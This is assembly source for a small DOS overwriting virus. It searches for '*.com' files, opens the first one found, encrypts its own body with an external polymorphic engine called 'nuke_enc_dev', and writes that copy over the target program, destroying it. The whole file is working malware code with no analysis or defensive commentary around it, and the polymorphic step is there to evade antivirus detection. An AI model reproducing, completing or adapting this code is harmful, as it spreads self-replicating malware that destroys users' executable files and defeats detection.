

.model tiny
.code

extrn		ned_end:abs
extrn		nuke_enc_dev:near

                org 100h

Main:           Mov Ah,4eh
On2:            Lea Dx,FileSpec
                Int 21h
                Mov Ax,3d02h
                Mov Dx,9eh
                Int 21h
		lea	ax,[bp + ned_end]
		lea	bx,[bp + main]
		mov	cx,0100h
		mov	dx,end_of_code - main
		mov	si,0000000000001111b
		call	nuke_enc_dev
		push	ax
                Mov Bh,40h
                Xchg Ax,Bx
                Lea Dx,Main
                Mov Cl,size_it
                Int 21h
                mov ah,4ch
                int 21h
FileSpec        Db '*.com',0
Size_it         Equ $-Main

end_of_code:
END     MAIN

